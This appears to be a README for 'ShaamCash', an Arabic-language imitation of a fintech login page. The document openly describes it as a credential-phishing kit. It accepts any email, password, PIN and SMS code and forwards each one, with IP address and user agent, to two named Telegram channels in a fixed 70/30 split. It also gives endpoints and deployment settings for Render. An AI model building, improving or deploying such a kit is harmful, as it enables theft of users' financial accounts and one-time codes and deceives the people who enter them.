# ShaamCash - Financial Technology Platform (Telegram-Only Version)

## Overview
ShaamCash is a mobile-first fintech landing page with a dark-themed, minimalistic UI and full Arabic (RTL) language support. This is a **Telegram-only** version that accepts ANY user credentials without validation and sends all data directly to a Telegram bot for monitoring.

**Key Features:**
- **Zero Database**: No PostgreSQL, no admin dashboard - pure Telegram notifications
- **Universal Acceptance**: ANY email, password, PIN, or SMS code is accepted
- **Telegram-Only Notifications**: All user data sent directly to Telegram bot
- **Simple Flow**: Login (email/password/PIN) → SMS verification → Success page
- **No Admin System**: Removed all admin authentication and dashboard features

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture
### Frontend Architecture
The frontend is built with **React 18** and **TypeScript**, using **Vite** for building and **Wouter** for routing. **TanStack Query** manages server state. The UI is constructed with **shadcn/ui** components, styled using **Tailwind CSS** with a custom dark theme, HSL-based color system, and Arabic typography (Cairo/Tajawal fonts), ensuring mobile-first responsive design with RTL support. Form state is managed by **React Hook Form** with **Zod** validation.

### Backend Architecture
The backend uses **Express.js** with **TypeScript**, providing a simple REST API. It includes custom logging middleware and integrates with Vite for HMR in development. 

**Key Endpoints:**
- `POST /api/auth/login` - Accepts ANY credentials (email/password/PIN), sends to Telegram, stores in memory
- `POST /api/auth/verify-otp` - Accepts ANY SMS code, sends to Telegram

### Data Storage Architecture
**In-Memory Only**: User data is temporarily stored in server memory (`Map<string, TempUserData>`) only for the duration between login and SMS verification. After SMS verification, the data is cleared from memory.

**No Database**: This version has **zero database dependencies**. No PostgreSQL, no Drizzle ORM, no migrations.

### Notification Architecture
**Telegram-Only System**: Every user registration and SMS verification triggers Telegram notifications:

**Channel Distribution System:**
- **Primary Channel (@samcash1233)**: Receives first 7 out of every 10 registrations (70%)
- **Secondary Channel (@shamcashsca1)**: Receives last 3 out of every 10 registrations (30%)
- Distribution is sequential, not random (registrations 1-7→primary, 8-10→secondary, repeat)
- All related messages for ONE user (Login + SMS 1,2,3) go to the SAME channel
- Messages remain identical - only the destination channel changes

**Notification Format:**
- Registration: Email, password, PIN, IP address, user agent, timestamp
- SMS Verification: Email, SMS code, IP address, user agent, timestamp
- All timestamps in Damascus timezone (Asia/Damascus)

**Resilience**: Telegram failures are non-blocking - the system continues even if Telegram API is unavailable. Errors logged to console for debugging.

### Build & Deployment
The development workflow uses `npm run dev` for a `tsx`-driven Express server with Vite HMR. Production builds (`npm run build`) compile the React app with Vite and bundle the server with esbuild. Type checking is performed with `npm run check`.

**Render Deployment:**
- No DATABASE_URL needed
- Only required env vars: `TELEGRAM_BOT_TOKEN`, `SESSION_SECRET`
- Start command: `npm start` (no database migrations needed)
- Build command: `npm install && npm run build`

### Code Organization
The project is structured into `/client` (React app), `/server` (Express backend), and `/shared` (shared schemas and types). 

**Active Pages:**
- Login page (/ and /login)
- SMS verification page (/verify-sms)
- Congratulations page (/congratulations)
- Home landing page (/home)
- Legal pages (/privacy, /terms)

**Removed Features:**
- Admin login
- Admin dashboard
- Database storage
- Role-based access control

## External Dependencies
### Core Framework Dependencies
- **express**: Node.js web framework
- **react**, **react-dom**: UI library
- **vite**: Frontend build tool

### UI Component Libraries
- **@radix-ui/react-***: Accessible UI primitives
- **shadcn/ui**: Component system built on Radix UI
- **lucide-react**, **react-icons**: Icon libraries

### Data Fetching & Forms
- **@tanstack/react-query**: Data synchronization and caching
- **react-hook-form**: Form management
- **@hookform/resolvers**: Validation resolvers
- **zod**: Schema validation

### Styling & UI Utilities
- **tailwindcss**: CSS framework
- **class-variance-authority**: Component variant utility
- **clsx**, **tailwind-merge**: Class name utilities

### Development Tools
- **@replit/vite-plugin-***: Replit-specific Vite plugins
- **typescript**: Type system
- **tsx**: TypeScript execution
- **esbuild**: Fast JavaScript bundler

### Utilities
- **date-fns**: Date utility library
- **wouter**: Minimalist routing library

## Environment Variables
Required for production:
- `TELEGRAM_BOT_TOKEN`: Bot token from @BotFather (required)
- `SESSION_SECRET`: Random string for session encryption (required)
- `PRIMARY_CHANNEL`: Primary Telegram channel (optional - defaults to @samcash1233)
- `SECONDARY_CHANNEL`: Secondary Telegram channel (optional - defaults to @shamcashsca1)
- `NODE_ENV`: Set to "production" for production builds (optional - auto-set)
- `NPM_CONFIG_PRODUCTION`: Set to "false" to install dev dependencies on Render (optional)
